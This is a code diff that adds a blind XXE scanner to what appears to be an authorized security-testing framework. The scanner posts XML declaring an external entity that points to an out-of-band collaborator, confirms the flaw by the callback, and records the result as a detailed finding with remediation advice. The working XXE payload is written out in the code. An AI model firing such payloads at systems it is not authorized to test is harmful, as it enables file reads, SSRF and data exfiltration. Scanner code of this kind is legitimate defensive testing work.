@@ -23,6 +23,64 @@ def _candidates(appmodel):
     return out
 
 
+_XXE_PATH_HINTS = ("import", "xml", "upload", "parse", "soap", "feed", "ingest", "document", "data")
+
+
+def blind_xxe_scan(runner, collaborator, appmodel, target_url, application="target",
+                   timeout: float = 3.0) -> list[Finding]:
+    """POST an XML external-entity payload pointing at the collaborator; a callback confirms XXE."""
+    findings = []
+    eps = [e for e in appmodel.endpoints if (e.method or "GET").upper() in ("POST", "PUT")
+           and any(h in e.path.lower() for h in _XXE_PATH_HINTS)]
+    for ep in eps:
+        token, oob_url = collaborator.new_token()
+        xml = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "{oob_url}">]><r>&xxe;</r>')
+        probe = runner.post(ep.path, xml, content_type="application/xml", payload_class="boundary-probe",
+                            rationale="blind-XXE: external entity to OOB collaborator", summary="xxe probe")
+        if not probe.executed or not collaborator.wait_for(token, timeout=timeout):
+            continue
+        ctrl_token, _ = collaborator.new_token()
+        if collaborator.wait_for(ctrl_token, timeout=0.3):   # a never-injected token must stay clean
+            continue
+        f = Finding(
+            engagement_id=runner.engagement_id,
+            title=f"Blind XXE via XML external entity on {ep.method} {ep.path} (out-of-band confirmed)",
+            vuln_class="XXE", severity="high", confidence="confirmed", state=State.VALIDATED,
+            cwe=["CWE-611"], owasp={"web_2025": ["A05:2021-Security Misconfiguration"],
+                                    "api_2023": ["API8:2023-Security Misconfiguration"]},
+            cvss=CVSS(version="4.0", base_score=8.2, severity="high",
+                      vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:L/VA:N/SC:L/SI:N/SA:N"),
+            asset={"type": "api_endpoint", "application": application, "environment": "authorized",
+                   "target": target_url},
+            endpoint={"method": ep.method, "url": f"{target_url}{ep.path}", "auth_required": False},
+            description=(f"{ep.method} {ep.path} resolves XML external entities; a declared SYSTEM entity "
+                         "caused an outbound request to an attacker-controlled collaborator (blind XXE)."),
+            impact="Read internal files / SSRF to internal services / exfiltrate data via out-of-band channels.",
+            root_cause="The XML parser resolves external entities (DTD/SYSTEM) on untrusted input.",
+            reproduction=Reproduction(prerequisites=["An OOB collaborator reachable from the target"],
+                                      steps=[f"POST XML with <!ENTITY … SYSTEM \"<collaborator>/<token>\"> to {ep.path}",
+                                             "Observe an inbound callback for that token"],
+                                      deterministic=True),
+            remediation=Remediation(summary="Disable DTD/external-entity resolution in the XML parser.",
+                                    type="code_patch",
+                                    guidance=("Disable DOCTYPE/DTDs and external entities (e.g. defusedxml, "
+                                              "FEATURE_SECURE_PROCESSING, resolve_entities=False) (CWE-611)."),
+                                    effort="low"),
+            references=["https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
+                        "https://cwe.mitre.org/data/definitions/611.html"],
+            compliance_control_refs=["SOC2:CC6.6", "ISO27001:A.8.26"],
+            dedupe_key=f"{application}:{ep.method}:{ep.path}:xxe", tags=["xxe", "blind", "out-of-band"],
+            verification=Verification(method="out-of-band-collaborator", validated=True, validated_at=now_iso(),
+                                      validator="oob-collaborator", independent_reproduction=True, reproductions=1,
+                                      false_positive_checks=[f"collaborator received a callback for token {token[:12]}…",
+                                                             "negative control token received NO callback"],
+                                      confidence_score=0.97))
+        f.evidence.extend(probe.evidence)
+        f.assert_consistent()
+        findings.append(f)
+    return findings
+
+
 def blind_ssrf_scan(runner, collaborator, appmodel, target_url, application="target",
                     timeout: float = 3.0) -> list[Finding]:
     """For each SSRF-shaped parameter, inject a unique collaborator URL and confirm a callback."""
